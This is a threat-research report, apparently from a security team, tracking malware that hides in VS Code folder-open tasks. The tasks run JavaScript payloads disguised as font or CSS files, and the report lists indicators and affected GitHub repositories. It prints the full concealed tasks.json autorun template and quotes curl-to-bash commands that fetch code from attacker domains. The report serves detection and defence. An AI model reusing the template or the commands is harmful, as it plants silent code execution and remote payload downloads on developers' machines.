# Task V: VSCode folderOpen Pattern Scan

**Date:** 2026-06-28  
**Task:** Search GitHub for `.vscode/tasks.json` with `runOn: "folderOpen"` + font-file execution to
find infected repos beyond what public reports documented.

---

## Summary

GitHub code search returned **143 repos** matching the `folderOpen + node + woff2` pattern.
After filtering out security-research fixtures and actor-controlled staging repos, ~130 are
victim developer machines. The search also reveals multiple **related but distinct delivery
campaigns** sharing the VSCode task vector but using different C2 infrastructure.

---

## Search Methodology

| Query | Hits | Notes |
|-------|------|-------|
| `folderOpen node woff2 filename:tasks.json` | **143** | Primary — confirmed PolinRider pattern |
| `fa-brands-regular.woff2 folderOpen filename:tasks.json` | **15** | Subset — older payload filename |
| `filename:fa-solid-400.woff2` | 652 | Mostly legitimate font files |
| `lib.min.js folderOpen filename:tasks.json` | **0** | Dragon-Lady indicator not found via search |

---

## tasks.json Pattern

All PolinRider-variant infected repos share a template:

```json
{
  "label": "eslint-check",
  "type": "shell",
  "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-400.woff2) || (where node >nul 2>&1 && node ./public/fonts/fa-solid-400.woff2) || echo ''",
  "isBackground": true,
  "hide": true,
  "presentation": {"reveal": "never", "echo": false, "close": true},
  "runOptions": {"runOn": "folderOpen"}
}
```

Cross-platform check (`command -v` for Unix, `where` for Windows) confirms this targets
developers on both Linux/macOS and Windows.

---

## Payload Filename Variants

| Filename | Path | Repos | Notes |
|----------|------|-------|-------|
| `fa-solid-400.woff2` | `public/fonts/` | ~110 | Most common |
| `fa-solid-400.woff2` | `public/fontawesome/` | ~15 | Older pattern |
| `fa-brands-regular.woff2` | `webfonts/` | ~15 | Earlier variant; simpler command (`node webfonts/...` only) |
| `fa-brands-regular.woff2` | `public/webfonts/` | ~5 | — |
| `fa-brands-regular.woff2` | `public/fonts/` | ~2 | — |
| `RNSSanz-Black-2.woff2` | `public/fonts/` | 1 (`peterma/dante-labs-assessment`) | Custom font name |
| `globals_light.css` | `src/app/` | 1 (`chocoscoding/hmmm`) | CSS extension disguise |

The evolution from `fa-brands-regular.woff2` (simpler command, no cross-platform check) to
`fa-solid-400.woff2` (cross-platform double-check) suggests the actor refined the delivery
in response to failures on one OS.

---

## Newly Confirmed Victim Repos (selected — beyond prior public reports)

### Page 1 (30 hits)
| Repo | Payload file | Notes |
|------|-------------|-------|
| `madeeldev/flutter-vpn` | `public/fonts/fa-solid-400.woff2` | Campaign ID: `10-010` (new); `_$_1e42` cipher |
| `madeeldev/flutter-simple-login-signup` | `public/fonts/fa-solid-400.woff2` | Same developer |
| `hoangnv170752/StudyNest` | `public/fonts/fa-solid-400.woff2` | `_$_1e42` cipher |
| `HKTareen/practitioner` | `public/fonts/fa-solid-400.woff2` | `_$_1e42` cipher |
| `FarazRashid/FintechAdvise` | `public/fonts/fa-solid-400.woff2` | `_$_1e42` cipher |
| `SURUJ404/NFT-GAMEFY` | `public/fontawesome/fa-solid-400.woff2` | — |
| `Up-De/Metaverse-Game` | `public/fontawesome/fa-solid-400.woff2` | — |
| `uplandme-hub/Real-Estate` | `public/fontawesome/fa-solid-400.woff2` | — |
| `Softvence-Omega-Dev-Ninjas/diaz-dashboard-jupiter` | `public/fonts/fa-solid-400.woff2` | — |
| `zainulhassan815/currency-converter` | `public/fonts/fa-solid-400.woff2` | — |
| `geektutor/wewe` | `public/fonts/fa-solid-400.woff2` | — |
| `CollActionteam/collaction_cms` | `public/fonts/fa-solid-400.woff2` | — |
| `Dagimassefa/flutter-login-and-registration-with-email` | `public/fonts/fa-solid-400.woff2` | — |
| `DSC-Unilag/dsc-unilag-app` | `public/fonts/fa-solid-400.woff2` | DSC University of Lagos |
| `DSC-Unilag/Code-Workshop-Mobile-Project` | `public/fonts/fa-solid-400.woff2` | — |
| `hngx-org/mirage-kotlin-auth-library` | `public/fonts/fa-solid-400.woff2` | HNG Nigeria hackathon |
| `hngi/Team-Geras-Solar-Calculator` | `public/fonts/fa-solid-400.woff2` | — |
| `felipekm/token-swap` | `public/webfonts/fa-brands-regular.woff2` | Different obfuscator (obfuscator.io style) |
| `peterma/dante-labs-assessment` | `public/fonts/RNSSanz-Black-2.woff2` | Custom font name |
| `CrustLab-WCT/World-FanHub` | `webfonts/fa-brands-regular.woff2` | — |
| `tinchx1/backend-test` | `public/fonts/fa-brands-regular.woff2` | — |

### Pages 2–4 (additional victim clusters)
| Developer / Org | Repos infected | Notes |
|-----------------|---------------|-------|
| `Letalandroid` | 10+ | Android Studio projects (Peru) |
| `hngx-org` | 6+ | HNG Nigeria org repos |
| `hngi` | 4+ | HNG Nigeria individual repos |
| `SajidAfridi` | 4 | Pakistan developer |
| `DSC-Unilag` | 3 | Developer Student Club, Univ. of Lagos |
| `abubakarmunir712` | 3 | Pakistan CS coursework repos |
| `NikhilGupta777` | 2 | — |
| `KIHM-02` | 2 | — |
| `Reactongraph` | 2 | — |
| `devlopersabbir` | 2 | — |
| `ZarakiLancelot` | 2 | — |
| `Tmahn001` | 2 | — |
| `kadave462` | 2 | — |

### Page 5 — Fake Job Interview Staging Repos
These appear to be actor-created or actor-targeted repos used as fake job assessment tasks:

| Repo | Pattern | Notes |
|------|---------|-------|
| `israel1408/Upland-blockchain-hometask` | `fa-solid-400.woff2` | "Upland" fake hometask; WJS IIFE payload (55K) |
| `JoshOrndorff/hometask-blockchain` | `fa-solid-400.woff2` | — |
| `Viclaww/hometask-fullstack` | `fa-solid-400.woff2` | — |
| `cs-joy/blockchain-assessment` | `fa-solid-400.woff2` | — |
| `PawelTatomir/Real-Estate` | `fa-brands-regular.woff2` | — |
| `visheshrajvicky/Blockchain-Based-Certificate-System` | `fa-brands-regular.woff2` | — |
| `AryaLanjewar3005/assignment-consensys` | `fa-brands-regular.woff2` | ConsenSys fake assessment |
| `10kartik/Student-Management-System-Deloitte` | `fa-brands-regular.woff2` | Deloitte fake assessment |
| `achron/MetaRace-MVP` | `fa-brands-regular.woff2` | — |
| `ravindrasingh7897/Kingsmen` | `fa-brands-regular.woff2` | — |
| `cj4c0b1/decentralized-voting-system` | `fa-brands-regular.woff2` | — |

---

## Actor-Controlled Staging Repos (BestCity Cluster)

These repos appear to be **actor-owned fake company repositories** used as fake interview
material — the victim is told to clone and open this repo:

| Repo | Payload size | Payload type |
|------|-------------|-------------|
| `technoknol/bestcity` | 55,985 bytes | WJS IIFE shuffle cipher (full Stage 1+2?) |
| `AbstractFruitFactory/bestcity-demo` | likely same | — |
| `fullstackragab/bestcity` | — | `fa-brands-regular.woff2` variant |
| `BestCity-v1/Demo-v1` | — | `fa-brands-regular.woff2` variant |

The `technoknol/bestcity` 55,985-byte payload is too large for Stage 0 alone — this is
likely the full Stage 1 or combined Stage 1+2 embedded in the repo rather than fetched from
blockchain. Actor-controlled means these repos can be updated freely.

---

## New Campaign ID

`madeeldev/flutter-vpn` payload: `global['!']='10-010'`

`10-010` doesn't match the `5-X-Y` format of known campaign IDs. This may indicate a
different campaign branch (separate actor operator, different target geography, or a test
campaign with a different numbering scheme).

---

## Related But Distinct Delivery Campaigns

GitHub search surfaced repos using the **same `folderOpen` mechanism** but different C2
infrastructure — these are separate campaign clusters, not PolinRider/ChainVeil:

### curl-to-bash cluster (regioncheck.xyz)
- `ta3pks/Decentralized-Social`: `curl 'https://www.regioncheck.xyz/settings/mac?flag=8' | bash && nohup node .vscode/...`
- C2 domain: `www.regioncheck.xyz` (live as of Abstract Security report)

### Vercel CDN cluster
- `dmbruno/card-activity`: `curl 'https://codeviewer-three.vercel.app/task/mac?token=6df937fe9011' | sh`
- Uses Vercel for payload hosting; unique token per victim

### CSS-extension disguise
- `chocoscoding/hmmm`: `node src/app/globals_light.css`
- JS payload hidden inside a `.css` file

These clusters may be different Contagious Interview operators who adopted the `folderOpen`
delivery technique independently. Their C2 infrastructure does not overlap with our known
PolinRider IPs.

---

## New IOCs

### Domains / URLs (from Abstract Security research)
- `www.regioncheck.xyz` — curl-to-bash C2 (different actor)
- `codeviewer-three.vercel.app` — Vercel payload delivery
- `vscodeconfig.com` — mentioned by Abstract Security (same cluster)
- `vscode-load.onrender.com` — Render CDN delivery variant

### npm packages
- `jsonwebauth` (published 2026-01-08) — 326KB obfuscated payload in `lib/lserver.js`

### Credential artifact
- MongoDB username hardcoded in one payload: `dulanjalisenarathna93`

### New payload filenames (IOCs for YARA/scanner rules)
- `fa-brands-regular.woff2` executed via `node` in `.vscode/tasks.json`
- `RNSSanz-Black-2.woff2` executed via `node`
- `globals_light.css` executed via `node` in `.vscode/tasks.json`
- `spellright.dict` executed via `node` in `.vscode/tasks.json`

---

## What Was NOT Found

- **`lib/lib.min.js`** — zero GitHub search hits for this Dragon-Lady indicator pattern.
  Either Dragon-Lady's indicator is from private/deleted repos, or this filename was
  used in a different context not indexed by code search.
- **lib.min.js in tasks.json** — 0 results for this specific combination.

---

## Scale Assessment

Public reports (JFrog, OpenSourceMalware, Dragon-Lady) document dozens of infected repos.
Our GitHub search finds **143 repos** matching just the `folderOpen+node+woff2` pattern —
and GitHub code search has known gaps (deleted files, private repos, repos added after
indexing). The true scale is likely 200–400+ victim developer repos from this delivery
vector alone.

The HNG Nigeria hackathon cluster (`hngx-org`, `hngi`, `DSC-Unilag`) is particularly
noteworthy — these developers are likely participating in coding bootcamps or hackathons,
where cloning and opening repos in VSCode is standard workflow. The actor is deliberately
targeting developer communities where folderOpen execution is habitual.

---

## Sources

- Abstract Security: "Contagious Interview: Tracking the VS Code Tasks Infection Vector"
  → `abstract.security/blog/contagious-interview-tracking-the-vs-code-tasks-infection-vector`
- JFrog: "Hijacked npm Packages Use Novel VSCode Autorun and Blockchain Dead Drops"
  → `research.jfrog.com/post/hijacked-npm-vscode-tasks-blockchain/`
- Microsoft VSCode issue #309406: `.vscode/tasks.json with runOn: folderOpen enables silent code execution`
  → `github.com/microsoft/vscode/issues/309406`
- OpenSourceMalware: "How Malware Abuses NPM Lifecycle Scripts and VS Code Tasks"
